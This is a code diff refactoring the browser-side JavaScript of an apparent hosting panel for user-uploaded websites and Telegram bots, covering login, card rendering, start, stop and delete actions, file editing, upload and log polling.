+                    loginError.textContent = 'Please enter username and password.';
+                    return;
+                }
+                try {
+                    const data = await apiCall('/login', {
+                        method: 'POST',
+                        body: JSON.stringify({ username, password, role })
+                    });
+                    if (data.success) {
+                        currentUser = { username: data.username, role: data.role };
+                        document.querySelector('.login-card').classList.add('login-success');
+                        setTimeout(() => { location.reload(); }, 500);
+                    }
+                } catch(e) {
+                    document.querySelector('.login-card').classList.add('shake');
+                    setTimeout(() => { document.querySelector('.login-card').classList.remove('shake'); }, 500);
+                    loginError.textContent = e.message || 'Login failed';
+                }
+            }
+
+            async function handleLogout() {
+                const confirmed = await customConfirm('Logout?', '👋');
+                if (!confirmed) return;
+                try {
+                    await apiCall('/logout', { method: 'POST' });
+                } catch (_) {}
+                location.reload();
+            }
+
+            // ---------- TAB SWITCHING ----------
+            const tabBtns = document.querySelectorAll('.tabs .tab-btn');
+            tabBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    tabBtns.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                    const tabId = this.dataset.tab;
+                    document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+                    document.getElementById('tab-' + tabId).classList.add('active');
+                    if (tabId === 'websites') {
+                        loadWebsites();
+                    } else if (tabId === 'bots') {
+                        loadBots();
+                    }
+                    sessionStorage.setItem('activeTab', tabId);
+                });
+            });
+
+            const savedTab = sessionStorage.getItem('activeTab') || 'bots';
+            const savedTabBtn = document.querySelector(`.tabs .tab-btn[data-tab="${savedTab}"]`);
+            if (savedTabBtn) {
+                savedTabBtn.click();
+            }
+
+            // ---------- WEBSITES ----------
+            async function loadWebsites() {
+                try {
+                    const res = await fetch('/api/websites');
+                    const data = await res.json();
+                    renderWebsites(data);
+                } catch (e) {
+                    console.error('Failed to load websites:', e);
+                    websiteGrid.innerHTML = `<div class="empty-msg">Error loading websites</div>`;
+                }
+            }
+
+            function renderWebsites(websites) {
+                if (!websites || websites.length === 0) {
+                    websiteGrid.innerHTML = `<div class="empty-msg">No websites deployed. Upload a project!</div>`;
+                    return;
+                }
+                let html = '';
+                websites.forEach(w => {
+                    const statusClass = w.status === 'running' ? 'running' : 'stopped';
+                    const uptimeDisplay = w.status === 'running' && w.last_start_time ?
+                        formatUptime((Date.now() / 1000) - new Date(w.last_start_time).getTime()/1000) :
+                        '--';
+                    const selected = (w.id === selectedWebsiteId) ? 'selected' : '';
+                    const startupFile = w.startup_file || 'app.py';
+                    html += `
+                        <div class="website-card ${selected}" data-id="${w.id}">
+                            <div class="website-header">
+                                <span class="website-name">${escapeHtml(w.website_name || w.website_slug)}</span>
+                                <span class="bot-status ${statusClass}">● ${w.status.toUpperCase()}</span>
+                            </div>
+                            <div class="website-startup-file">📄 ${escapeHtml(startupFile)}</div>
+                            <div class="visit-btn-container">
+                                ${w.status === 'running' ? `
+                                <div style="margin-bottom: 8px;">
+                                    <a href="/${w.website_slug}/" target="_blank" class="btn-visit-w">
+                                        🌐 Visit Website
+                                    </a>
+                                </div>` : ''}
+                            </div>
+                            <div class="website-slug">🔗 ${escapeHtml(w.website_slug)}</div>
+                            <div class="website-port">Port: ${w.allocated_port || 'N/A'}</div>
+                            <div class="bot-uptime" id="w-uptime-${w.id}">UPTIME: ${uptimeDisplay}</div>
+                            <div class="website-actions">
+                                <button class="btn-start-w" data-action="start-w" data-id="${w.id}">▶ START</button>
+                                <button class="btn-stop-w" data-action="stop-w" data-id="${w.id}">⏹ STOP</button>
+                                <button class="btn-restart-w" data-action="restart-w" data-id="${w.id}">⟳ RESTART</button>
+                                <button class="btn-delete-w" data-action="delete-w" data-id="${w.id}">🗑 DELETE</button>
+                                <button class="btn-edit-w" data-action="edit-w" data-id="${w.id}">✎ EDIT</button>
+                                <button class="btn-download-w" data-action="download-w" data-id="${w.id}">⬇ DOWNLOAD</button>
+                                <button class="btn-files-w" data-action="files-w" data-id="${w.id}">📁 FILES</button>
+                                <button class="btn-buildlogs-w" data-action="buildlogs-w" data-id="${w.id}">🖥 BUILD LOGS</button>
+                            </div>
+                            <div class="name-edit">
+                                <input type="text" placeholder="Rename" id="w-name-input-${w.id}" value="${escapeHtml(w.website_name || '')}" />
+                                <button onclick="renameWebsite(${w.id})">Rename</button>
+                            </div>
+                        </div>
+                    `;
+                });
+                websiteGrid.innerHTML = html;
+                attachWebsiteEvents();
+                attachWebsiteCardClicks();
+
+                // Uptime updates
+                websites.forEach(w => {
+                    if (w.status === 'running' && w.last_start_time) {
+                        const start = new Date(w.last_start_time).getTime() / 1000;
+                        startUptimeUpdate('w-uptime-' + w.id, start);
+                    }
+                });
+
+                if (!selectedWebsiteId && websites.length > 0) {
+                    selectWebsite(websites[0].id);
+                }
+            }
+
+            function attachWebsiteEvents() {
+                document.querySelectorAll('.website-card [data-action]').forEach(btn => {
+                    btn.removeEventListener('click', handleWebsiteAction);
+                    btn.addEventListener('click', handleWebsiteAction);
+                });
+            }
+
+            function attachWebsiteCardClicks() {
+                document.querySelectorAll('.website-card').forEach(card => {
+                    card.removeEventListener('click', handleCardClick);
+                    card.addEventListener('click', handleCardClick);
+                });
+            }
+
+            function handleCardClick(e) {
+                if (e.target.closest('button') || e.target.closest('.name-edit')) return;
+                const id = parseInt(this.dataset.id);
+                selectWebsite(id);
+            }
+
+            async function handleWebsiteAction(e) {
+                e.stopPropagation();
+                const action = this.dataset.action;
+                const id = parseInt(this.dataset.id);
+                if (action === 'start-w') {
+                    await websiteAction(id, 'start');
+                } else if (action === 'stop-w') {
+                    await websiteAction(id, 'stop');
+                } else if (action === 'restart-w') {
+                    await websiteAction(id, 'restart');
+                } else if (action === 'delete-w') {
+                    const confirmed = await customConfirm('Delete this website?', '🗑️');
+                    if (confirmed) {
+                        await websiteAction(id, 'delete');
+                    }
+                } else if (action === 'edit-w') {
+                    await editWebsite(id);
+                } else if (action === 'download-w') {
+                    window.open(`/api/website/${id}/download`, '_blank');
+                } else if (action === 'files-w') {
+                    window.open(`/website/${id}/files`, '_blank');
+                } else if (action === 'buildlogs-w') {
+                    window.open(`/website/${id}/build`, '_blank');
+                }
+            }
+
+            async function websiteAction(id, action) {
+                try {
+                    const res = await apiCall(`/api/website/${id}/${action}`, { method: 'POST' });
+                    if (res.success) {
+                        // ✅ ONLY update status, NO page reload
+                        await updateWebsiteStatus(id);
+                    } else {
+                        await customAlert(res.error || 'Action failed', '❌');
+                    }
+                } catch (e) {
+                    await customAlert(e.message, '❌');
+                }
+            }
+
+            async function updateWebsiteStatus(id) {
+                try {
+                    const res = await fetch('/api/websites');
+                    const websites = await res.json();
+                    const website = websites.find(w => w.id === id);
+                    if (website) {
+                        updateWebsiteCard(website);
+                    }
+                } catch (e) {
+                    console.error('Failed to update website status:', e);
+                }
+            }
+
+            function updateWebsiteCard(website) {
+                const card = document.querySelector(`.website-card[data-id="${website.id}"]`);
+                if (!card) return;
+                
+                // Update status
+                const statusEl = card.querySelector('.bot-status');
+                const statusClass = website.status === 'running' ? 'running' : 'stopped';
+                statusEl.className = `bot-status ${statusClass}`;
+                statusEl.textContent = `● ${website.status.toUpperCase()}`;
+                
+                // Update uptime
+                const uptimeEl = document.getElementById(`w-uptime-${website.id}`);
+                if (uptimeEl && website.status === 'running' && website.last_start_time) {
+                    const start = new Date(website.last_start_time).getTime() / 1000;
+                    uptimeEl.textContent = 'UPTIME: ' + formatUptime(Date.now()/1000 - start);
+                    startUptimeUpdate(`w-uptime-${website.id}`, start);
+                } else if (uptimeEl) {
+                    uptimeEl.textContent = 'UPTIME: --';
+                }
+                
+                // ✅ Show/Hide Visit Website button dynamically WITHOUT refresh
+                let visitContainer = card.querySelector('.visit-btn-container');
+                if (!visitContainer) {
+                    const header = card.querySelector('.website-header');
+                    visitContainer = document.createElement('div');
+                    visitContainer.className = 'visit-btn-container';
+                    header.after(visitContainer);
+                }
+                
+                if (website.status === 'running') {
+                    visitContainer.innerHTML = `
+                        <div style="margin-bottom: 8px;">
+                            <a href="/${website.website_slug}/" target="_blank" class="btn-visit-w">
+                                🌐 Visit Website
+                            </a>
+                        </div>
+                    `;
+                } else {
+                    visitContainer.innerHTML = '';
+                }
+                
+                // Update port
+                const portEl = card.querySelector('.website-port');
+                if (portEl) {
+                    portEl.textContent = `Port: ${website.allocated_port || 'N/A'}`;
+                }
+            }
+
+            async function editWebsite(id) {
+                try {
+                    const data = await apiCall(`/api/website/${id}/content`);
+                    const content = data.content || '';
+                    const filename = data.filename || 'app.py';
+                    const bodyHTML = `
+                        <div style="margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
+                            <span style="color:#888;font-family:monospace;font-size:0.8rem;">📄 ${filename}</span>
+                            <button class="btn-sm" id="copyAllBtnW" style="padding:6px 14px;font-size:0.55rem;border:1px solid #33ddff;color:#33ddff;background:transparent;border-radius:6px;cursor:pointer;">
+                                📋 Copy All
+                            </button>
+                        </div>
+                        <textarea id="editFileContentW" rows="15" style="width:100%;background:#050807;color:#00ff88;border:1px solid #333;border-radius:6px;padding:10px;font-family:'Courier New',monospace;font-size:0.7rem;resize:vertical;tab-size:4;">${escapeHtml(content)}</textarea>
+                    `;
+                    const result = await showCustomModal('✎ Edit File', bodyHTML, [
+                        { label: 'Cancel', value: false, className: 'btn-cancel' },
+                        { label: '💾 SAVE', value: true, className: 'btn-confirm' }
+                    ]);
+                    if (result) {
+                        const newContent = document.getElementById('editFileContentW').value;
+                        try {
+                            await apiCall(`/api/website/${id}/content`, {
+                                method: 'PUT',
+                                body: JSON.stringify({ content: newContent })
+                            });
+                            await customAlert('File saved and website restarted (if running).', '✅');
+                            await updateWebsiteStatus(id);
+                        } catch (e) {
+                            await customAlert(e.message, '❌');
+                        }
+                    }
+                    setTimeout(() => {
+                        const copyBtn = document.getElementById('copyAllBtnW');
+                        if (copyBtn) {
+                            copyBtn.onclick = function() {
+                                const textarea = document.getElementById('editFileContentW');
+                                textarea.select();
+                                try {
+                                    navigator.clipboard.writeText(textarea.value).then(() => {
+                                        customAlert('📋 Copied all code!', '✅');
+                                    }).catch(() => {
+                                        document.execCommand('copy');
+                                        customAlert('📋 Copied!', '✅');
+                                    });
+                                } catch(e) {
+                                    document.execCommand('copy');
+                                    customAlert('📋 Copied!', '✅');
+                                }
+                            };
+                        }
+                    }, 100);
+                } catch (e) {
+                    await customAlert(e.message, '❌');
+                }
+            }
+
+            function selectWebsite(id) {
+                selectedWebsiteId = id;
+                document.querySelectorAll('.website-card').forEach(c => c.classList.remove('selected'));
+                const card = document.querySelector(`.website-card[data-id="${id}"]`);
+                if (card) card.classList.add('selected');
+                loadWebsiteLogs(id);
+                if (websiteLogInterval) clearInterval(websiteLogInterval);
+                websiteLogInterval = setInterval(() => loadWebsiteLogs(id, true), 3000);
+            }
+
+            async function loadWebsiteLogs(id, silent = false) {
+                try {
+                    const data = await apiCall(`/api/website/${id}/logs`);
+                    websiteConsole.textContent = data.logs || 'No logs yet.';
+                } catch (e) {
+                    if (!silent) websiteConsole.textContent = 'Error loading logs.';
+                }
+            }
+
+            async function renameWebsite(id) {
+                const input = document.getElementById('w-name-input-' + id);
+                const newName = input.value.trim();
+                if (!newName) return;
+                try {
+                    const formData = new FormData();
+                    formData.append('name', newName);
+                    const res = await fetch(`/api/website/${id}/rename`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await loadWebsites();
+                    } else {
+                        await customAlert(data.error || 'Rename failed', '❌');
+                    }
+                } catch (e) {
+                    await customAlert(e.message, '❌');
+                }
+            }
+
+            // ---------- WEBSITE UPLOAD ----------
+            uploadCardWebsite.addEventListener('click', function(e) {
+                if (e.target.closest('.deploy-btn')) return;
+                fileInputWebsite.click();
+            });
+
+            deployBtnWebsite.addEventListener('click', async function() {
+                if (fileInputWebsite.files.length === 0) {
+                    await customAlert('Please select at least one file first.', '⚠️');
+                    return;
+                }
+                const formData = new FormData();
+                for (let i = 0; i < fileInputWebsite.files.length; i++) {
+                    formData.append('files[]', fileInputWebsite.files[i]);
+                }
+                try {
+                    deployBtnWebsite.textContent = 'UPLOADING...';
+                    deployBtnWebsite.disabled = true;
+                    const res = await fetch('/upload_website', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert(`Website deployed! ID: ${data.website_id}`, '✅');
+                        // ✅ Add new website WITHOUT page reload
+                        await addNewWebsite(data.website_id);
+                        fileInputWebsite.value = '';
+                        fileCountDisplayWebsite.textContent = '';
+                    } else {
+                        await customAlert(data.error || 'Upload failed', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                } finally {
+                    deployBtnWebsite.textContent = 'DEPLOY WEBSITE';
+                    deployBtnWebsite.disabled = false;
+                }
+            });
+
+            async function addNewWebsite(websiteId) {
+                try {
+                    const res = await fetch('/api/websites');
+                    const websites = await res.json();
+                    const newWebsite = websites.find(w => w.id === websiteId);
+                    if (newWebsite) {
+                        const grid = document.getElementById('websiteGrid');
+                        const emptyMsg = grid.querySelector('.empty-msg');
+                        if (emptyMsg) emptyMsg.remove();
+                        const cardHtml = createWebsiteCard(newWebsite);
+                        grid.insertAdjacentHTML('beforeend', cardHtml);
+                        attachWebsiteEvents();
+                        attachWebsiteCardClicks();
+                        // Start uptime if running
+                        if (newWebsite.status === 'running' && newWebsite.last_start_time) {
+                            const start = new Date(newWebsite.last_start_time).getTime() / 1000;
+                            startUptimeUpdate(`w-uptime-${newWebsite.id}`, start);
+                        }
+                        // Auto select new website
+                        selectWebsite(newWebsite.id);
+                    }
+                } catch (e) {
+                    console.error('Failed to add new website:', e);
+                }
+            }
+
+            function createWebsiteCard(w) {
                 const statusClass = w.status === 'running' ? 'running' : 'stopped';
                 const uptimeDisplay = w.status === 'running' && w.last_start_time ?
-                    formatUptime((Date.now()/1000) - new Date(w.last_start_time).getTime()/1000) : '--';
-                const selected = (w.id === selectedWebsiteId) ? 'selected' : '';
+                    formatUptime((Date.now() / 1000) - new Date(w.last_start_time).getTime()/1000) :
+                    '--';
                 const startupFile = w.startup_file || 'app.py';
-                const visitButton = w.status === 'running' ?
-                    `<div class="visit-btn-container"><a href="/${w.website_slug}/" target="_blank" class="btn-visit-w">🌐 Visit Website</a></div>` :
-                    '<div class="visit-btn-container"></div>';
-                html += `
-                    <div class="website-card ${selected}" data-id="${w.id}">
-                        <div class="website-header"><span class="website-name">${escapeHtml(w.website_name || w.website_slug)}</span><span class="bot-status ${statusClass}">● ${w.status.toUpperCase()}</span></div>
+                return `
+                    <div class="website-card" data-id="${w.id}">
+                        <div class="website-header">
+                            <span class="website-name">${escapeHtml(w.website_name || w.website_slug)}</span>
+                            <span class="bot-status ${statusClass}">● ${w.status.toUpperCase()}</span>
+                        </div>
                         <div class="website-startup-file">📄 ${escapeHtml(startupFile)}</div>
-                        ${visitButton}
+                        <div class="visit-btn-container">
+                            ${w.status === 'running' ? `
+                            <div style="margin-bottom: 8px;">
+                                <a href="/${w.website_slug}/" target="_blank" class="btn-visit-w">
+                                    🌐 Visit Website
+                                </a>
+                            </div>` : ''}
+                        </div>
                         <div class="website-slug">🔗 ${escapeHtml(w.website_slug)}</div>
                         <div class="website-port">Port: ${w.allocated_port || 'N/A'}</div>
                         <div class="bot-uptime" id="w-uptime-${w.id}">UPTIME: ${uptimeDisplay}</div>
@@ -2706,841 +4663,1039 @@ HTML_TEMPLATE = """
                         </div>
                     </div>
                 `;
-            });
-            websiteGrid.innerHTML = html;
-
-            document.querySelectorAll('.website-card [data-action]').forEach(btn => {
-                btn.addEventListener('click', async function(e) {
-                    e.stopPropagation();
-                    const action = this.dataset.action;
-                    const id = parseInt(this.dataset.id);
-                    if (action === 'start-w') await websiteAction(id, 'start');
-                    else if (action === 'stop-w') await websiteAction(id, 'stop');
-                    else if (action === 'restart-w') await websiteAction(id, 'restart');
-                    else if (action === 'delete-w') {
-                        if (await customConfirm('Delete this website?', '🗑️')) await websiteAction(id, 'delete');
-                    } else if (action === 'edit-w') await editWebsite(id);
-                    else if (action === 'download-w') window.open(`/api/website/${id}/download`, '_blank');
-                    else if (action === 'files-w') window.open(`/website/${id}/files`, '_blank');
-                    else if (action === 'buildlogs-w') window.open(`/website/${id}/build`, '_blank');
-                });
-            });
-
-            document.querySelectorAll('.website-card').forEach(card => {
-                card.addEventListener('click', function(e) {
-                    if (e.target.closest('button') || e.target.closest('.name-edit')) return;
-                    selectWebsite(parseInt(this.dataset.id));
-                });
-            });
-
-            websites.forEach(w => {
-                if (w.status === 'running' && w.last_start_time) {
-                    startUptimeUpdate('w-uptime-' + w.id, new Date(w.last_start_time).getTime()/1000);
-                }
-            });
-            if (!selectedWebsiteId && websites.length > 0) selectWebsite(websites[0].id);
-        }
-
-        async function websiteAction(id, action) {
-            try {
-                const res = await apiCall(`/api/website/${id}/${action}`, { method: 'POST' });
-                if (res.success) { await loadWebsites(); setTimeout(() => loadWebsites(), 1000); }
-                else await customAlert(res.error || 'Action failed', '❌');
-            } catch(e) { await customAlert(e.message, '❌'); }
-        }
-
-        async function editWebsite(id) {
-            try {
-                const data = await apiCall(`/api/website/${id}/content`);
-                const content = data.content || '';
-                const filename = data.filename || 'app.py';
-                const bodyHTML = `
-                    <div style="margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
-                        <span style="color:#888;font-family:monospace;font-size:0.8rem;">📄 ${filename}</span>
-                        <button class="btn-sm" id="copyAllBtnW">📋 Copy All</button>
-                    </div>
-                    <textarea id="editFileContentW" rows="15">${escapeHtml(content)}</textarea>
-                `;
-                const result = await showCustomModal('✎ Edit File', bodyHTML, [
-                    { label: 'Cancel', value: false, className: 'btn-cancel' },
-                    { label: '💾 SAVE', value: true, className: 'btn-confirm' }
-                ]);
-                if (result) {
-                    const newContent = document.getElementById('editFileContentW').value;
-                    await apiCall(`/api/website/${id}/content`, { method: 'PUT', body: JSON.stringify({ content: newContent }) });
-                    await customAlert('File saved.', '✅');
-                    await loadWebsites();
-                }
-                setTimeout(() => {
-                    const copyBtn = document.getElementById('copyAllBtnW');
-                    if (copyBtn) copyBtn.onclick = function() {
-                        const ta = document.getElementById('editFileContentW');
-                        ta.select();
-                        navigator.clipboard?.writeText(ta.value)?.then(() => customAlert('📋 Copied!', '✅'));
-                    };
-                }, 100);
-            } catch(e) { await customAlert(e.message, '❌'); }
-        }
-
-        function selectWebsite(id) {
-            selectedWebsiteId = id;
-            document.querySelectorAll('.website-card').forEach(c => c.classList.remove('selected'));
-            const card = document.querySelector(`.website-card[data-id="${id}"]`);
-            if (card) card.classList.add('selected');
-            loadWebsiteLogs(id);
-            if (websiteLogInterval) clearInterval(websiteLogInterval);
-            websiteLogInterval = setInterval(() => loadWebsiteLogs(id, true), 3000);
-        }
-
-        async function loadWebsiteLogs(id, silent = false) {
-            try {
-                const data = await apiCall(`/api/website/${id}/logs`);
-                websiteConsole.textContent = data.logs || 'No logs yet.';
-            } catch(e) { if (!silent) websiteConsole.textContent = 'Error loading logs.'; }
-        }
-
-        window.renameWebsite = async function(id) {
-            const input = document.getElementById('w-name-input-' + id);
-            const newName = input.value.trim();
-            if (!newName) return;
-            try {
-                const formData = new FormData();
-                formData.append('name', newName);
-                const res = await fetch(`/api/website/${id}/rename`, { method: 'POST', body: formData });
-                const data = await res.json();
-                if (data.success) await loadWebsites();
-                else await customAlert(data.error || 'Rename failed', '❌');
-            } catch(e) { await customAlert(e.message, '❌'); }
-        };
-
-        // ----- WEBSITE UPLOAD -----
-        uploadCardWebsite.addEventListener('click', function(e) {
-            if (e.target.closest('.deploy-btn')) return;
-            fileInputWebsite.click();
-        });
-
-        deployBtnWebsite.addEventListener('click', async function() {
-            if (fileInputWebsite.files.length === 0) {
-                await customAlert('Please select at least one file first.', '⚠️');
-                return;
             }
-            const formData = new FormData();
-            for (let i = 0; i < fileInputWebsite.files.length; i++) formData.append('files[]', fileInputWebsite.files[i]);
-            try {
-                deployBtnWebsite.textContent = 'UPLOADING...';
-                deployBtnWebsite.disabled = true;
-                const res = await fetch('/upload_website', { method: 'POST', body: formData });
-                const data = await res.json();
-                if (data.success) {
-                    await customAlert(`Website deployed! ID: ${data.website_id}`, '✅');
-                    await loadWebsites();
-                    fileInputWebsite.value = '';
+
+            fileInputWebsite.addEventListener('change', function() {
+                const count = this.files.length;
+                if (count === 0) {
                     fileCountDisplayWebsite.textContent = '';
-                } else await customAlert(data.error || 'Upload failed', '❌');
-            } catch(e) { /* handled */ }
-            finally { deployBtnWebsite.textContent = 'DEPLOY WEBSITE'; deployBtnWebsite.disabled = false; }
-        });
+                } else {
+                    const names = Array.from(this.files).map(f => f.name).join(', ');
+                    fileCountDisplayWebsite.textContent = `${count} file(s) selected: ${names}`;
+                }
+            });
 
-        fileInputWebsite.addEventListener('change', function() {
-            const count = this.files.length;
-            fileCountDisplayWebsite.textContent = count ? `${count} file(s) selected` : '';
-        });
-
-        // ----- BOTS -----
-        async function loadBots() {
-            try {
-                const bots = await apiCall('/api/bots');
-                renderBots(bots);
-            } catch(e) {
-                botListContainer.innerHTML = `<div class="empty-msg">Error loading bots</div>`;
+            // ---------- BOTS ----------
+            async function loadBots() {
+                try {
+                    const bots = await apiCall('/api/bots');
+                    renderBots(bots);
+                } catch (e) {
+                    console.error('Failed to load bots:', e);
+                    botListContainer.innerHTML = `<div class="empty-msg">Error loading bots</div>`;
+                }
             }
-        }
 
-        function renderBots(bots) {
-            if (!bots || bots.length === 0) {
-                botListContainer.innerHTML = `<div class="empty-msg">No bots deployed.</div>`;
-                return;
-            }
-            let html = '';
-            bots.forEach(bot => {
-                const statusClass = bot.status === 'running' ? 'running' : 'stopped';
-                const uptimeDisplay = bot.status === 'running' && bot.start_time ?
-                    formatUptime(Date.now()/1000 - bot.start_time) : '--';
-                const selected = (bot.id === selectedBotId) ? 'selected' : '';
-                const hasToken = bot.has_token || false;
-                const botUsername = bot.bot_username || null;
-                html += `
-                    <div class="bot-card ${selected}" data-id="${bot.id}">
-                        <div class="bot-header"><span class="bot-name">${escapeHtml(bot.filename)}</span><span class="bot-status ${statusClass}">● ${bot.status.toUpperCase()}</span></div>
-                        <div class="bot-owner">👤 ${escapeHtml(bot.user)}</div>
-                        <div class="bot-uptime" id="uptime-${bot.id}">UPTIME: ${uptimeDisplay}</div>
-                        <div class="bot-controls">
-                            <button class="btn-start" data-action="start">${bot.status === 'running' ? '▶ RUNNING' : '▶ START'}</button>
-                            <button class="btn-stop" data-action="stop">⏹ STOP</button>
-                            <button class="btn-edit" data-action="edit">✎ EDIT</button>
-                            <button class="btn-restart" data-action="restart">⟳ RESTART</button>
-                            <button class="btn-download" data-action="download">⬇ DOWNLOAD</button>
-                            <button class="btn-delete" data-action="delete">🗑 DELETE</button>
-                            ${(hasToken && botUsername) ? `<button class="btn-openbot" data-action="openbot" data-bot="${botUsername}">🤖 Open Bot</button>` : ''}
+            function renderBots(bots) {
+                if (!bots || bots.length === 0) {
+                    botListContainer.innerHTML = `<div class="empty-msg">No bots deployed. Upload a project!</div>`;
+                    return;
+                }
+                let html = '';
+                bots.forEach(bot => {
+                    const statusClass = bot.status === 'running' ? 'running' : 'stopped';
+                    const uptimeDisplay = bot.status === 'running' && bot.start_time ?
+                        formatUptime(Date.now() / 1000 - bot.start_time) :
+                        '--';
+                    const selected = (bot.id === selectedBotId) ? 'selected' : '';
+                    const ownerDisplay = bot.user || 'unknown';
+                    const hasToken = bot.has_token || false;
+                    const botUsername = bot.bot_username || null;
+                    html += `
+                        <div class="bot-card ${selected}" data-id="${bot.id}" data-start-time="${bot.start_time || ''}">
+                            <div class="bot-header">
+                                <span class="bot-name">${escapeHtml(bot.filename)}</span>
+                                <span class="bot-status ${statusClass}">● ${bot.status.toUpperCase()}</span>
+                            </div>
+                            <div class="bot-owner">👤 ${escapeHtml(ownerDisplay)}</div>
+                            <div class="bot-uptime" id="uptime-${bot.id}">UPTIME: ${uptimeDisplay}</div>
+                            <div class="bot-controls">
+                                <button class="btn-start" data-action="start">${bot.status === 'running' ? '▶ RUNNING' : '▶ START'}</button>
+                                <button class="btn-stop" data-action="stop">⏹ STOP</button>
+                                <button class="btn-edit" data-action="edit">✎ EDIT</button>
+                                <button class="btn-restart" data-action="restart">⟳ RESTART</button>
+                                <button class="btn-download" data-action="download">⬇ DOWNLOAD</button>
+                                <button class="btn-delete" data-action="delete">🗑 DELETE</button>
+                                ${(hasToken && botUsername) ? `<button class="btn-openbot" data-action="openbot" data-bot="${botUsername}">🤖 Open Bot</button>` : ''}
+                            </div>
                         </div>
-                    </div>
-                `;
-            });
-            botListContainer.innerHTML = html;
-
-            document.querySelectorAll('.bot-card').forEach(card => {
-                card.addEventListener('click', function(e) {
-                    if (e.target.closest('button')) return;
-                    selectBot(this.dataset.id);
+                    `;
                 });
-            });
+                botListContainer.innerHTML = html;
 
-            document.querySelectorAll('.bot-card [data-action]').forEach(btn => {
-                btn.addEventListener('click', async function(e) {
-                    e.stopPropagation();
-                    const action = this.dataset.action;
-                    const card = this.closest('.bot-card');
-                    const botId = card.dataset.id;
-                    const originalText = this.textContent;
-                    this.disabled = true;
-                    try {
-                        if (action === 'openbot') {
-                            const botUsername = this.dataset.bot;
-                            if (botUsername) {
-                                window.open(`https://t.me/${botUsername}`, '_blank');
-                                await customAlert(`🤖 Opening @${botUsername}`, '✅');
+                document.querySelectorAll('.bot-card').forEach(card => {
+                    card.addEventListener('click', function(e) {
+                        if (e.target.closest('button')) return;
+                        const id = this.dataset.id;
+                        selectBot(id);
+                    });
+                });
+
+                document.querySelectorAll('.bot-card [data-action]').forEach(btn => {
+                    btn.addEventListener('click', async function(e) {
+                        e.stopPropagation();
+                        const action = this.dataset.action;
+                        const card = this.closest('.bot-card');
+                        const botId = card.dataset.id;
+                        const originalText = this.textContent;
+                        this.disabled = true;
+                        if (action === 'start') this.textContent = '⏳ Starting...';
+                        else if (action === 'stop') this.textContent = '⏳ Stopping...';
+                        else if (action === 'restart') this.textContent = '⏳ Restarting...';
+                        else if (action === 'delete') this.textContent = '⏳ Deleting...';
+                        else if (action === 'edit') { /* don't disable */ }
+                        else if (action === 'download') { /* don't disable */ }
+                        else if (action === 'openbot') { /* don't disable */ }
+                        try {
+                            if (action === 'openbot') {
+                                const botUsername = this.dataset.bot;
+                                if (botUsername) {
+                                    window.open(`https://t.me/${botUsername}`, '_blank');
+                                    await customAlert(`🤖 Opening @${botUsername}`, '✅');
+                                }
+                                this.disabled = false;
+                                this.textContent = originalText;
+                                return;
                             }
-                            this.disabled = false; this.textContent = originalText; return;
+                            if (action === 'edit') {
+                                await openEditModal(botId);
+                                this.disabled = false;
+                                this.textContent = originalText;
+                                return;
+                            }
+                            if (action === 'download') {
+                                window.open(`/api/bots/${botId}/download`, '_blank');
+                                this.disabled = false;
+                                this.textContent = originalText;
+                                return;
+                            }
+                            await handleBotAction(botId, action);
+                        } catch (e) {
+                            // error already handled
+                        } finally {
+                            if (action !== 'edit' && action !== 'download' && action !== 'openbot') {
+                                this.disabled = false;
+                                this.textContent = originalText;
+                            }
                         }
-                        if (action === 'edit') {
-                            await openEditModal(botId);
-                            this.disabled = false; this.textContent = originalText; return;
-                        }
-                        if (action === 'download') {
-                            window.open(`/api/bots/${botId}/download`, '_blank');
-                            this.disabled = false; this.textContent = originalText; return;
-                        }
-                        await handleBotAction(botId, action);
-                    } catch(e) {}
-                    finally {
-                        if (action !== 'edit' && action !== 'download' && action !== 'openbot') {
-                            this.disabled = false;
-                            this.textContent = originalText;
-                        }
+                    });
+                });
+
+                bots.forEach(bot => {
+                    if (bot.status === 'running' && bot.start_time) {
+                        startUptimeUpdate('uptime-' + bot.id, bot.start_time);
                     }
                 });
-            });
 
-            bots.forEach(bot => {
-                if (bot.status === 'running' && bot.start_time) {
-                    startUptimeUpdate('uptime-' + bot.id, bot.start_time);
+                if (!selectedBotId && bots.length > 0) {
+                    selectBot(bots[0].id);
                 }
-            });
-            if (!selectedBotId && bots.length > 0) selectBot(bots[0].id);
-        }
-
-        function startUptimeUpdate(elId, startTime) {
-            if (uptimeIntervals[elId]) clearInterval(uptimeIntervals[elId]);
-            const el = document.getElementById(elId);
-            if (!el) return;
-            uptimeIntervals[elId] = setInterval(() => {
-                const diff = Date.now()/1000 - startTime;
-                el.textContent = 'UPTIME: ' + formatUptime(diff);
-            }, 1000);
-        }
-
-        function selectBot(botId) {
-            selectedBotId = botId;
-            document.querySelectorAll('.bot-card').forEach(c => c.classList.remove('selected'));
-            const card = document.querySelector(`.bot-card[data-id="${botId}"]`);
-            if (card) card.classList.add('selected');
-            loadBotLogs(botId);
-            if (botLogInterval) clearInterval(botLogInterval);
-            botLogInterval = setInterval(() => loadBotLogs(botId, true), 3000);
-        }
-
-        async function loadBotLogs(botId, silent = false) {
-            try {
-                const data = await apiCall(`/api/bots/${botId}/logs`);
-                botConsole.textContent = data.logs || 'No logs yet.';
-            } catch(e) { if (!silent) botConsole.textContent = 'Error loading logs.'; }
-        }
-
-        async function handleBotAction(botId, action) {
-            try {
-                if (action === 'start') await apiCall(`/api/bots/${botId}/start`, { method: 'POST' });
-                else if (action === 'stop') await apiCall(`/api/bots/${botId}/stop`, { method: 'POST' });
-                else if (action === 'restart') await apiCall(`/api/bots/${botId}/restart`, { method: 'POST' });
-                else if (action === 'delete') {
-                    if (!await customConfirm('Delete this bot?', '🗑️')) return;
-                    await apiCall(`/api/bots/${botId}`, { method: 'DELETE' });
-                    if (selectedBotId === botId) { selectedBotId = null; if (botLogInterval) clearInterval(botLogInterval); botConsole.textContent = 'Bot deleted.'; }
-                } else return;
-                await loadBots();
-            } catch(e) { await customAlert(e.message || 'Action failed', '❌'); }
-        }
-
-        async function openEditModal(botId) {
-            try {
-                const data = await apiCall(`/api/bots/${botId}/content`);
-                const content = data.content || '';
